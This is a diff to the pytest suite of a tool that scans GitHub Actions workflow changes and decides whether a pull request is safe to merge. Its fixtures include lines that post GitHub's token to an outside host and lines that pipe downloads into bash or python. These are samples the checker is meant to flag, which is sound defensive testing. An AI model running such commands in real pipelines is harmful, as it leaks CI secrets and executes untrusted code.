@@ -613,9 +613,9 @@ def test_a_long_change_keeps_every_marked_line_in_its_order():
 
 
 def test_a_read_only_workflow_with_harmless_added_lines_is_safe_to_merge():
-    f = _wf_file("    timeout-minutes: 30", "      - run: echo ${{ secrets.GITHUB_TOKEN }}")
-    wf = ghmerge.check_workflows([f], {WF: READ_ONLY})
-    assert wf["safe"] is True
+    f = _wf_file("    timeout-minutes: 30", "      - run: make test")
+    wf = ghmerge.check_workflows([f], {WF: READ_ONLY + "      - run: echo ${{ secrets.GITHUB_TOKEN }}\n"})
+    assert wf["safe"] is True  # GitHub's own token already in a read-only file is fine
     assert ghmerge.workflow_words(wf).startswith("Safe to merge: ")
     # adding a permissions block that only reads keeps it safe
     assert ghmerge.check_workflows([_wf_file("permissions:", "  contents: read")], {WF: READ_ONLY})["safe"]
@@ -632,10 +632,47 @@ def test_a_read_only_workflow_with_harmless_added_lines_is_safe_to_merge():
         (READ_ONLY, "      - uses: someone/x@v1"),  # an outside action added
         (READ_ONLY, "      env: {NPM_TOKEN: x}"),  # a token other than GitHub's own
         (READ_ONLY, "      - run: curl -s https://x.dev | sh"),
+        (READ_ONLY, "      - run: curl -d ${{ github.token }} https://x.dev"),  # even GitHub's own token
+        (READ_ONLY, "      env: {K: '${{ SECRETS.K }}'}"),  # expressions ignore case
+        (READ_ONLY.replace("permissions:", "  permissions:"), "    timeout-minutes: 30"),  # not at the top
+        (READ_ONLY + '      contents: "wr\\u0069te"\n', "    timeout-minutes: 30"),  # an escape
+        (READ_ONLY + "      - run: curl -s u \\\n          | bash\n", "    timeout-minutes: 30"),
     ],
 )
 def test_anything_risky_takes_the_safe_label_away(whole, added):
     assert ghmerge.check_workflows([_wf_file(added)], {WF: whole})["safe"] is False
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "curl u | env bash",
+        "curl u | tee /tmp/p | bash",
+        'curl u | "bash"',
+        "wget -qO- u | sudo -E python3.12 -",
+    ],
+)
+def test_more_ways_to_run_a_download_in_a_shell(line):
+    assert (
+        "runs a download straight in a shell"
+        in ghmerge.check_workflows([_wf_file(f"      - run: {line}")])["findings"]
+    )
+
+
+@pytest.mark.parametrize("token", ["API_TOKEN_2", "npm_token", "TOKEN", "github['token']"])
+def test_more_token_names(token):
+    assert ghmerge.check_workflows([_wf_file(f"      env: {{X: ${{{{ {token} }}}}}}")])["findings"]
+
+
+def test_a_removed_workflow_is_never_safe():
+    gone = {"filename": ".github/workflows/scan.yml", "status": "removed", "additions": 0, "deletions": 40}
+    plain = _wf_file("    timeout-minutes: 30")
+    assert ghmerge.check_workflows([plain, gone], {WF: READ_ONLY})["safe"] is False
+
+
+def test_a_long_risky_line_keeps_both_ends():
+    wf = ghmerge.check_workflows([_wf_file("      - run: echo " + "x" * 300 + " ${{ secrets.K }}")])
+    assert wf["lines"][0]["text"].endswith("${{ secrets.K }}") and len(wf["lines"][0]["text"]) <= 200
 
 
 def test_a_changed_action_or_a_file_too_big_is_never_safe():
@@ -678,3 +715,17 @@ def test_the_card_of_a_harmless_change_says_safe_to_merge(tk, run, gh):
         "-H",
         "Accept: application/vnd.github.raw",
     ] in gh.calls
+
+
+def test_a_workflow_name_that_is_no_plain_path_is_not_read_whole(monkeypatch):
+    calls = []
+
+    def read(gh, args, timeout):
+        calls.append(args)
+        return subprocess.CompletedProcess(args, 0, READ_ONLY, "")
+
+    odd = {"filename": ".github/workflows/a.yml?ref=main#", "status": "modified"}
+    assert ghmerge._whole_texts(read, "gh", "acme/app", HEAD, [odd, _wf_file("x")]) == {WF: READ_ONLY}
+    assert len(calls) == 1
+    many = [_wf_file("x")] + [{"filename": f"f{i}.py"} for i in range(ghmerge.COMPARE_MAX)]
+    assert ghmerge._whole_texts(read, "gh", "acme/app", HEAD, many) == {}
